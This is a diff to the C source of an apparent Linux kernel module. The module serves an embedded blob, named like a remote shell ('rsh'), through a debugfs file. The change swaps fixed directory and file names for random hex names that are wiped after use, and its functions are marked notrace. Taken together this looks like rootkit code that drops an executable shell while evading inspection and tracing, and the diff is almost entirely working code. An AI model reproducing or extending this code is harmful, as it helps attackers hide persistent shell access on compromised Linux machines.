@@ -1,5 +1,6 @@
 #include <linux/module.h>
 #include <linux/debugfs.h>
+#include <linux/random.h>
 #include <linux/seq_file.h>
 
 #include "config.h"
@@ -11,7 +12,10 @@
 extern unsigned char _rsh_start[];
 extern unsigned char _rsh_end[];
 
-static struct dentry *_directory = NULL;
+static char _dir_name[HTM_MAX_FILENAME];
+static char _rsh_name[HTM_MAX_FILENAME];
+
+static struct dentry *_dir = NULL;
 static struct dentry *_file = NULL;
 
 static notrace int _show(struct seq_file *m, void *v)
@@ -35,7 +39,7 @@ static const struct file_operations _fops = {
 
 notrace int htm_debugfs_rsh_create(void)
 {
-	if (_directory && _file) {
+	if (_dir && _file) {
 		#ifdef HTM_DEBUG
 		htm_pr_warn("debugfs file is already exposed");
 		#endif
@@ -43,7 +47,7 @@ notrace int htm_debugfs_rsh_create(void)
 		return -EINVAL;
 	}
 	else
-	if (_directory) {
+	if (_dir) {
 		#ifdef HTM_DEBUG
 		htm_pr_err("debugfs directory already exists");
 		#endif
@@ -59,7 +63,17 @@ notrace int htm_debugfs_rsh_create(void)
 		return -EINVAL;
 	}
 
-	if (! (_directory = debugfs_create_dir(HTM_DEBUGFS_DIR, NULL))) {
+	scnprintf(
+		_dir_name, sizeof(_dir_name),
+		"%016llx" HTM_FS_STRING, get_random_u64()
+	);
+
+	scnprintf(
+		_rsh_name, sizeof(_rsh_name),
+		"%016llx" HTM_FS_STRING, get_random_u64()
+	);
+
+	if (! (_dir = debugfs_create_dir(_dir_name, NULL))) {
 		#ifdef HTM_DEBUG
 		htm_pr_err("failed to initialize debugfs directory for module");
 		#endif
@@ -68,20 +82,27 @@ notrace int htm_debugfs_rsh_create(void)
 	}
 
 	#ifdef HTM_DEBUG
-	htm_pr_notice("debugfs directory created: %s", HTM_DEBUGFS_DIR);
+	htm_pr_notice("debugfs directory created: %s", _dir_name);
 	#endif
 
-	if (! (_file = debugfs_create_file(HTM_DEBUGFS_FILE, 0500, _directory, NULL, &_fops))) {
+	if (! (_file = debugfs_create_file(_rsh_name, 0500, _dir, NULL, &_fops))) {
 		#ifdef HTM_DEBUG
-		htm_pr_err("failed to create debugfs file - removing directory");
+		htm_pr_err(
+			"failed to create debugfs file: %s - removing directory: %s",
+			_rsh_name, _dir_name
+		);
 		#endif
 
-		debugfs_remove(_directory);
+		debugfs_remove(_dir);
+
+		memset(_dir_name, 0x00, sizeof(_dir_name));
+		memset(_rsh_name, 0x00, sizeof(_rsh_name));
+
 		return -ENOMEM;
 	}
 
 	#ifdef HTM_DEBUG
-	htm_pr_notice("debugfs file created: %s", HTM_DEBUGFS_FILE);
+	htm_pr_notice("debugfs file created: %s", _rsh_name);
 	#endif
 
 	return 0;
@@ -89,7 +110,7 @@ notrace int htm_debugfs_rsh_create(void)
 
 notrace int htm_debugfs_rsh_remove(void)
 {
-	if (! _file && ! _directory) {
+	if (! _file && ! _dir) {
 		#ifdef HTM_DEBUG
 		htm_pr_warn("debugfs file is not exposed");
 		#endif
@@ -105,7 +126,7 @@ notrace int htm_debugfs_rsh_remove(void)
 		return -EINVAL;
 	}
 	else
-	if (! _directory) {
+	if (! _dir) {
 		#ifdef HTM_DEBUG
 		htm_pr_err("debugfs directory does not exist");
 		#endif
@@ -113,14 +134,27 @@ notrace int htm_debugfs_rsh_remove(void)
 		return -EINVAL;
 	}
 
-	debugfs_remove_recursive(_directory);
+	debugfs_remove_recursive(_dir);
 
 	#ifdef HTM_DEBUG
-	htm_pr_notice("debugfs directory removed");
+	htm_pr_notice("debugfs directory removed: %s", _dir_name);
 	#endif
 
 	_file = NULL;
-	_directory = NULL;
+	memset(_rsh_name, 0x00, sizeof(_rsh_name));
+
+	_dir = NULL;
+	memset(_dir_name, 0x00, sizeof(_dir_name));
 
 	return 0;
+}
+
+notrace char *htm_debugfs_dir_name(void)
+{
+	return _dir_name;
+}
+
+notrace char *htm_debugfs_rsh_name(void)
+{
+	return _rsh_name;
 }
